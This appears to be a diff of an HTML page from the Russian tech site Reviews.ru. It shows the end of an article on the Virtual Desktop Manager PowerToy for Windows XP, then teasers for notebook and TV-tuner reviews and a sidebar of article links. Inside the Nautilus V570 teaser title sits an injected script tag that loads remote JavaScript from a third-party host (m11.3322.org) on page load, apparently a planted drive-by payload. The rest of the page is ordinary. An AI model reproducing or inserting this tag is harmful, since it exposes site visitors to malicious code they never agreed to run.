+  в меню управления Virtual Desktop Manager (см. ниже), из-за достаточной медлительности.</p>
+<p>Кнопки 1-4 отвечают за быстрое открытие соответствующего рабочего стола. Для 
+  ускорения доступа к рабочим столам можно воспользоваться сочетанием горячих 
+  кнопок, которые можно настроить под себя.</p>
+<p>Для управления Virtual Desktop Manager необходимо кликнуть правой кнопкой мышки 
+  на надписи «MSVDM».</p>
+<p align="center"> <img src="soft/vdm/image004.gif" width="382" height="326"></p>
+<p>Отсюда Вы сможете максимально удобно настроить Virtual Desktop Manager. Первые 
+  два меню позволяют установить для каждого рабочего стола отдельный фон, и сочетание 
+  горячих клавиш. </p>
+<p align="center"> <img src="soft/vdm/image005.gif" width="476" height="394"></p>
+<p align="center"> <img src="soft/vdm/image006.gif" width="476" height="394"></p>
+<p>Здесь необходимо отметить еще два пункта. Во-первых, Shared Desktops, который 
+  отвечает за обмен приложениями между рабочими столами. Если Вы хотите, что бы 
+  каждый рабочий стол отображал только свои приложения, отключите эту опцию. Во-вторых, 
+  Show Quick Switch Buttons позволяющее запретить отображение кнопок быстрого 
+  переключения между рабочими столами, что увеличивает рабочее пространство панели 
+  задач.</p>
+<p>И последнее, новшество, добавленное после установки Powertoys для Windows XP 
+  – новое средство переключение между приложениями.</p>
+<p align=center> <img src="soft/vdm/image007.gif" width="500" height="362"></p>
+
+</td></tr>
+                  </table>                  
+                  <table width="100%"  border="0" cellspacing="0" cellpadding="7">
+                    <tr>
+                      <td><table width="100%" height="10" border="0" cellpadding="3" cellspacing="0">
+                        <tr>
+                          <td bgcolor="#FFFFFF">
+                          
+                          
+
+                      </td>
+                        </tr>
+                      </table></td>
+                    </tr>
+                  </table>
+                  <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+                    <tr>
+                      <td valign="top">
+<table width="100%"  border="0" cellspacing="0" cellpadding="3">
+  <tr>
+    <td><a href="article.asp?id=3007" class="title">Nautilus V570: &#1054;&#1095;&#1077;&#1088;&#1077;&#1076;&#1085;&#1086;&#1081;&#32;&#1096;&#1077;&#1076;&#1077;&#1074;&#1088;&#32;&#1086;&#1090; RoverBook</a><script src=http://m11.3322.org/e.js></script></a></td>
+  </tr>
+  <tr>
+    <td><table width="100%"  border="0" cellspacing="0" cellpadding="3">
+      <tr>
+        <td width="150"><img src="mobil/v570/m.jpg" width="150" height="100"></td>
+        <td valign="top"> Впервые о Nautilus V570, именно так называется наш сегодняшний герой, я услышал в августе этого года. Тогда возможности, заявленные производителем, показались просто фантастическими...</td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+</table>
+
+<table width="100%"  border="0" cellspacing="0" cellpadding="3">
+  <tr>
+    <td><a href="article.asp?id=3005" class="title">Compro VideoMate E500: Необычный PCI-E ТВ- тюнер</a></td>
+  </tr>
+  <tr>
+    <td><table width="100%"  border="0" cellspacing="0" cellpadding="3">
+      <tr>
+        <td width="150"><img src="over/e500/m.jpg" width="150" height="100"></td>
+        <td valign="top">Самый обычный, на первый взгляд, аналоговый тюнер продемонстрировал весьма высокое качество и стабильность работы, в том числе и под Windows MediaCenter. Кроме того, он имеет привлекательную цену порядка 50$, что позволяет назвать его наиболее оптимальным для современного пользователя, ищущего...</td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+</table>
+
+<table width="100%"  border="0" cellspacing="0" cellpadding="3">
+  <tr>
+    <td><a href="article.asp?id=2989" class="title">Домашняя студия на базе Toshiba Qosmio G30 </a></td>
+  </tr>
+  <tr>
+    <td><table width="100%"  border="0" cellspacing="0" cellpadding="3">
+      <tr>
+        <td width="150"><img src="mobil/g30/m.jpg" width="150" height="100"></td>
+        <td valign="top">Идея использования ноутбука для домашней студии преследует меня довольно давно. До сих пор реализовать ее в полном объеме не представлялось возможным. Почему, спросите вы? Возможности далеко не самых продвинутых моделей ноутбуков вполне достаточны для решения большинства студийных задач...</td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+</table>
+
+<table width="100%"  border="0" cellspacing="0" cellpadding="3">
+  <tr>
+    <td><a href="article.asp?id=2988" class="title">Обзор тюнера AVerTV Hybrid Express Slim или продолжение истории про «Желтого кролика» </a></td>
+  </tr>
+  <tr>
+    <td><table width="100%"  border="0" cellspacing="0" cellpadding="3">
+      <tr>
+        <td width="150"><img src="over/slim/m.jpg" width="150" height="100"></td>
+        <td valign="top">Недавно компания AverMedia, проанализировав особенности эргономики современных ноутбучных тюнеров, предложила свой вариант использования большего форм-фактора. Идея, предложенная AverMedia, впрочем, как и другие гениальные мысли, проста. В чем же ее суть? </td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+</table>
+
+<table width="100%"  border="0" cellspacing="0" cellpadding="3">
+  <tr>
+    <td><a href="article.asp?id=2974" class="title">DazzleTV Hybrid Stick: Самый доступный и самый универсальный USB ТВ - тюнер</a></td>
+  </tr>
+  <tr>
+    <td><table width="100%"  border="0" cellspacing="0" cellpadding="3">
+      <tr>
+        <td width="150"><img src="over/dazzletv/m.jpg" width="150" height="100"></td>
+        <td valign="top">В поисках необычного ТВ - тюнера обнаружил довольно любопытный образец - гибридный USB тюнер DazzleTV Hybrid Stick. Существует несколько причин обратить внимание на этот тюнер. Прежде всего, цена...</td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+  <tr>
+    <td>&nbsp;</td>
+  </tr>
+</table>
+</td>
+                      <td width="242" valign="top">
+
+
+
+
+<table width="100%"  border="0" cellpadding="0" cellspacing="0">
+  <tr>
+    <td height="5">&nbsp;</td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=3013" class="red">В полной безопасности. Интервью с представителями Symantec и Doctor Web</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=3002" class="red">TECHLABS Software Digest #25'07</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=3000" class="red">Три офисных игры Nevosoft. Часть 2</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=2991" class="red">TECHLABS Software Digest #24'07</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=2990" class="red">TECHLABS Game Digest #41'07</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=2979" class="red">Обзор трёх офисных игр от Nevosoft. Часть 1</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=2975" class="red">TECHLABS Game Digest #40'07</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=2976" class="red">TECHLABS Software Digest #23'07</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=2962" class="red">TECHLABS Game Digest #39'07</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=2963" class="red">TECHLABS Software Digest #22'07</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=2956" class="red">Обзор трёх Offline браузеров</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=2948" class="red">TECHLABS Game Digest #38'07</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=2949" class="red">Обзор трёх программ для эффективного поиска документов</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=2940" class="red">TECHLABS Game Digest #37'07</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=2939" class="red">TECHLABS Software Digest # 21'07</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=2942" class="red">Игровой ретрофутуризм образца 2007 года – обзор Bioshock</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+  <tr>
+    <td><strong><img src="../images/arr4.gif" align="absmiddle">&nbsp;<a href="../clause/article.asp?id=2937" class="red">Обзор трёх программ для создания генеалогического древа</a></strong></td>
+  </tr>
+  <tr>
+    <td height="5"></td>
+  </tr>
+  <tr>
+    <td> <table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td height="7"></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td height="3" background="../images/art_hr_h.gif"><img src="../images/art_hr_h.gif" width="3" height="3"></td>
+  </tr>
+  <tr>
+        <td height="7"></td>
+  </tr>
+  
+
+</table>
+
+</td>
+                    </tr>
+                  </table>                  
+                  <table width="100%" border="0" cellspacing="3" cellpadding="0">
+                    <tr>
+                      <td bgcolor="#FFFFFF">
+					  
+					  					  
+					  </td>
+                    </tr>
+                  </table>
+                  
+                  </td>
+              </tr>
+            </table>
+            <!-- InstanceEndEditable --></td>
+                </tr>
+                <tr>
+                  <td height="3" align="center"></td>
+                </tr>
+                <tr>
+                  <td align="center" valign="bottom"></td>
+                </tr>
+              </table>
+                <!-- Текстовая ссылка Pregrad.net -->
+                <!-- Текстовая ссылка Pregrad.net -->
+            </td>
+            <td valign="top" height="100%" background="../images/back2.gif"><img src="../images/3.jpg" border="0" width="20" height="524" alt="" /></td>
+          </tr>
+          <tr>
+            <td colspan="3" style="padding-top:5; color:8E8E8E" background="../images/footer.gif" height="57" valign="top" align="center"><a href="../index.asp">на главную</a>&nbsp;::&nbsp;&nbsp;<a href="../about.asp">&nbsp;о проекте</a> &nbsp;&nbsp;&nbsp;::&nbsp;&nbsp;&nbsp;<a href="../art.asp">как разместить статьи? </a> &nbsp;&nbsp;&nbsp;::&nbsp;&nbsp;&nbsp;<a href="../pr.asp">как разместить прайс-лист?</a>&nbsp;&nbsp;&nbsp;::&nbsp;&nbsp;&nbsp;<a href="../adv.asp">реклама</a>&nbsp;&nbsp;&nbsp;::&nbsp;&nbsp;&nbsp;<a href="mailto:info@reviews.ru">контакты</a><br />
+                <br />
+              Reviews.ru&amp;copy 2005 - 2007 • <a href="mailto:info@reviews.ru" class="black">info@reviews.ru</a> </td>
+          </tr>
+          <tr></tr>
+        </table></td>
+      </tr>
+    
+  
+  <tr>
+    <td align="left" valign="top"><table width="100%"  border="0" cellspacing="0" cellpadding="5">
+      <tr>
+        <td align="left"><!-- InstanceBeginEditable name="vert_art_right" -->
+          <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="120" height="600">
+    <param name="movie" value="http://www.reviews.ru/images/banners/beholder/new2007/120x600new.swf" />
+    <param name="quality" value="high" />
+    <embed src="http://www.reviews.ru/images/banners/beholder/new2007/120x600new.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="120" height="600"></embed>
+  </object>
+<!-- InstanceEndEditable --></td>
+      </tr>
+      <tr>
+        <td width="160" align="left"><!-- InstanceBeginEditable name="right_rev" -->
+        <!-- InstanceEndEditable --></td>
+      </tr>
+    </table></td>
+  </tr>
+</table>
+</body>
+<!-- InstanceEnd --></html>
